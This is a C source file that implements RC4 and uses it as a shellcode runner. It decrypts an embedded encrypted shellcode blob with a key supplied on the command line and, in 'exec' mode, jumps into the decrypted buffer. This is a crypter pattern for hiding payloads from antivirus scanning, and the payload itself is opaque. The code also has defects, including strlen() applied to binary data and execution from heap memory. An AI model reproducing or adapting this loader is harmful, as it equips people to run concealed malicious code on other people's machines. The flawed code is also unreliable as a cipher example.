/*
    robin verton, dec 2015
    implementation of the RC4 algo
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define N 256   // 2^8

void swap(unsigned char *a, unsigned char *b) {
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int KSA(char *key, unsigned char *S) {

    int len = strlen(key);
    int j = 0;

    for(int i = 0; i < N; i++)
        S[i] = i;

    for(int i = 0; i < N; i++) {
        j = (j + S[i] + key[i % len]) % N;

        swap(&S[i], &S[j]);
    }

    return 0;
}

int PRGA(unsigned char *S, char *plaintext, unsigned char *ciphertext) {

    int i = 0;
    int j = 0;

    for(size_t n = 0, len = strlen(plaintext); n < len; n++) {
        i = (i + 1) % N;
        j = (j + S[i]) % N;

        swap(&S[i], &S[j]);
        int rnd = S[(S[i] + S[j]) % N];

        ciphertext[n] = rnd ^ plaintext[n];

    }

    return 0;
}

int RC4(char *key, char *plaintext, unsigned char *ciphertext) {

    unsigned char S[N];
    KSA(key, S);

    PRGA(S, plaintext, ciphertext);

    return 0;
}

int main(int argc, char *argv[]) {

    if(argc < 3) {
        printf("Usage: %s <key> enc|exec", argv[0]);
        return -1;
    }

     unsigned char shellcode[] = "\x58\xD9\xAF\xA5\x6E\x11\x78\x90\x45\x94\x5E\xE5\xD4\xD9\x1A\xB5\x19\xD7\xBF\x24\x0A\x48\x26\xD5\xA9";


     unsigned char *ciphertext = malloc(sizeof(int) * (sizeof(shellcode)-1));
	
     RC4(argv[1], shellcode, ciphertext);


	printf("Original_shellcode\n");

	for(size_t i = 0, len = sizeof(shellcode)-1; i < len; i++)
                        printf("\\x%02hhX", shellcode[i]);




	if(!strcmp(argv[2],"exec")){
	        printf("\nexecuting_shellcode\n");
		 printf("%s", argv[2]);		
		(*(void  (*)()) ciphertext)();
	}else{
		printf("\nDecrypted_shellcode\n");
		for(size_t i = 0, len = sizeof(shellcode)-1; i < len; i++)
        		printf("\\x%02hhX", ciphertext[i]);	
	 }
    return 0;
}
